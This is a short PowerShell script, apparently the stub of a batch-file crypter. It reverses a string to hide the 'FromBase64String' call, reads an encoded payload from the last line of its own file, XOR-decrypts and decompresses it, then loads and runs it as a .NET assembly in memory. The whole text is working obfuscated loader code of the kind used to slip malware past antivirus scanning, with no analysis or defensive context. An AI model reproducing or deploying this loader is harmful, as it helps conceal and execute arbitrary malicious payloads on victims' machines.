$tbsreversed_var = 'gnirtS46esaBmorF'.ToCharArray();
[array]::Reverse($tbsreversed_var);
$tbs_var = [String]::new($tbsreversed_var);
$contents_var = [System.IO.File]::ReadAllText('%~f0').Split([Environment]::NewLine);
$lastline_var = $contents_var[$contents_var.Length - 1];
$payload_var = [System.Convert]::$tbs_var($lastline_var);
$key_var = [System.Convert]::$tbs_var('DECRYPTION_KEY');
for ($i = 0; $i -le $payload_var.Length - 1; $i++) { $payload_var[$i] = ($payload_var[$i] -bxor $key_var[$i %% $key_var.Length]); };
$msi_var = New-Object System.IO.MemoryStream(, $payload_var);
$mso_var = New-Object System.IO.MemoryStream;
$gs_var = New-Object System.IO.Compression.GZipStream($msi_var, [IO.Compression.CompressionMode]::Decompress);
$gs_var.CopyTo($mso_var);
$gs_var.Dispose();
$msi_var.Dispose();
$mso_var.Dispose();
$payload_var = $mso_var.ToArray();
[System.Reflection.Assembly]::Load($payload_var).EntryPoint.Invoke($null, (, [string[]] ('%*')))